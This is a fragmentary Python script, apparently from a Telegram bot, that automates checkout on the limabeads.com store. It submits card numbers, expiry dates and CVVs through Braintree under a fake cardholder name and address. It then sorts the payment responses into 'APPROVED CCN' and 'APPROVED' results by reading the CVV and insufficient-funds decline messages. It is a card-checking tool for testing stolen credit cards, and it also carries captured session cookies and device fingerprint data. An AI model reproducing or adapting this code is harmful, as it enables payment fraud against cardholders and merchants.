...
━━━━━━━━━━━━━━━━  </b>""", reply_markup=keyboard, disable_web_page_preview=True)
    ...
    headers = {
            ...
            # 'Cookie': 'lima_sid=id239fqaf5voii300bm25mdf17; cookie_pref=all; _fbp=fb.1.1707285800460.998476734; _ga=GA1.1.958227298.1707285801; _ga_F9R42RGHKX=GS1.1.1707285800.1.1.1707285801.0.0.0; _uetsid=9824a340c57e11eebfaa37869c062bcc; _uetvid=9825d7a0c57e11ee88d4a78cfb461d4c; hideEmailSignupOffer=1',
            'Origin': 'https://www.limabeads.com',
            'Referer': 'https://www.limabeads.com/New-Products-for-2-1-2024-C16921?filter=16975',
    ...
    for retry in range(max_retries):
        try:
            response = session.post('https://www.limabeads.com/store/shop/AddToBag', headers=headers, data=data).cookies
    ...
    headers = {
            ...
            # 'Cookie': 'lima_sid=id239fqaf5voii300bm25mdf17; cookie_pref=all; _fbp=fb.1.1707285800460.998476734; _ga=GA1.1.958227298.1707285801; hideEmailSignupOffer=1; _ga_F9R42RGHKX=GS1.1.1707285800.1.1.1707285827.0.0.0; _uetsid=9824a340c57e11eebfaa37869c062bcc; _uetvid=9825d7a0c57e11ee88d4a78cfb461d4c',
            'Origin': 'https://www.limabeads.com',
            'Referer': 'https://www.limabeads.com/store/shop/ShoppingBag',
    ...
    for retry in range(max_retries):
        try:
            ...
            response = session.post('https://www.limabeads.com/store/shop/ShoppingBag', headers=headers, data=data)
    ...
    headers = {
            ...
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'Cookie': 'lima_sid=id239fqaf5voii300bm25mdf17; cookie_pref=all; _fbp=fb.1.1707285800460.998476734; _ga=GA1.1.958227298.1707285801; hideEmailSignupOffer=1; _ga_F9R42RGHKX=GS1.1.1707285800.1.1.1707285834.0.0.0; _uetsid=9824a340c57e11eebfaa37869c062bcc; _uetvid=9825d7a0c57e11ee88d4a78cfb461d4c',
            'Origin': 'https://www.limabeads.com',
            'Referer': 'https://www.limabeads.com/store/checkout3/CheckoutController',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    ...
    for retry in range(max_retries):
        try:
            ...
            'https://www.limabeads.com/store/checkout3/SaveNewCustomerInfo',
            headers=headers,
            data=data,
        )
            break
    ...
    headers = {
            ...
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'Cookie': 'lima_sid=id239fqaf5voii300bm25mdf17; cookie_pref=all; _fbp=fb.1.1707285800460.998476734; _ga=GA1.1.958227298.1707285801; hideEmailSignupOffer=1; _uetsid=9824a340c57e11eebfaa37869c062bcc; _uetvid=9825d7a0c57e11ee88d4a78cfb461d4c; _ga_F9R42RGHKX=GS1.1.1707285800.1.1.1707285863.0.0.0',
            'Origin': 'https://www.limabeads.com',
            'Referer': 'https://www.limabeads.com/store/checkout3/CheckoutController',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
    ...
    data = {
            'submitNewAddress': '1',
            'country': 'US',
            'full_name': 'Andres Bermudez',
            'address1': 'street 16th, av. billonarie',
            'address2': '',
            'city': 'New York',
            'state': 'NY',
            'zip': '10080',
    ...
    for retry in range(max_retries):
        try:
            response = session.post(
            'https://www.limabeads.com/store/checkout3/SaveShippingAddress',
            headers=headers,
            data=data,
        )
    ...
    headers = {
            ...
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'Cookie': 'lima_sid=id239fqaf5voii300bm25mdf17; cookie_pref=all; _fbp=fb.1.1707285800460.998476734; _ga=GA1.1.958227298.1707285801; hideEmailSignupOffer=1; _uetsid=9824a340c57e11eebfaa37869c062bcc; _uetvid=9825d7a0c57e11ee88d4a78cfb461d4c; _ga_F9R42RGHKX=GS1.1.1707285800.1.1.1707285882.0.0.0',
            'Origin': 'https://www.limabeads.com',
            'Referer': 'https://www.limabeads.com/store/checkout3/CheckoutController',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
    ...
    data = {
            'shippingMethod': 'USPS-GroundAdvantage',
        }
    ...
    for retry in range(max_retries):
        try:
            ...
            response = session.post(
            'https://www.limabeads.com/store/checkout3/SaveShippingMethod',
            headers=headers,
            data=data,
        ).text
        
            clienttoken = parseX(response, "var clientToken = '", "'")
    ...
    headers = {
            ...
            'origin': 'https://www.limabeads.com',
            'referer': 'https://www.limabeads.com/',
            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            ...
            'variables': {
                'input': {
                    'creditCard': {
                        ...
                        'expirationYear': ano,
                        'cvv': cvv,
                        'cardholderName': 'Andres Bermudez',
                        'billingAddress': {
                            'postalCode': '10080',
                        },
                    },
    ...
    data = {
            ...
            'braintree_device_data': '{"device_session_id":"e3f32684fea2ec8ae9fbc0289b7d17ba","fraud_merchant_id":null,"correlation_id":"669e2b6068f665c9400e35068fffbc38"}',
            'braintree_nonce': tokencc,
            'braintree_payment_type': 'Credit Card',
            'cardholder_name': 'Andres Bermudez',
            'billing_zip': '10080',
        }
    ...
    for retry in range(max_retries):
        try:
            response = session.post('https://www.limabeads.com/store/checkout3/MakePayment', headers=headers, data=data).text
    ...
    headers = {
            ...
            'Connection': 'keep-alive',
            # 'Content-Length': '0',
            # 'Cookie': 'lima_sid=id239fqaf5voii300bm25mdf17; cookie_pref=all; _fbp=fb.1.1707285800460.998476734; _ga=GA1.1.958227298.1707285801; hideEmailSignupOffer=1; _uetsid=9824a340c57e11eebfaa37869c062bcc; _uetvid=9825d7a0c57e11ee88d4a78cfb461d4c; _ga_F9R42RGHKX=GS1.1.1707285800.1.1.1707285909.0.0.0',
            'Origin': 'https://www.limabeads.com',
            'Referer': 'https://www.limabeads.com/store/checkout3/CheckoutController',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
    ...
    for retry in range(max_retries):
        try:
            response = session.post('https://www.limabeads.com/store/checkout3/PlaceOrder', headers=headers).json()
    ...
    if "The transaction was declined due to a problem with the 3-4 digit Security Code (CVV). Enter the correct Security Code, and try again. Or, try using a different payment method to complete your purchase." in code:
            msg = "APPROVED CCN✅"
            respuesta = "Card Issuer Declined CVV"
            
    elif "The transaction was declined due to insufficient funds. To complete your order, please try a different payment method." in code:
            msg = "APPROVED ✅"
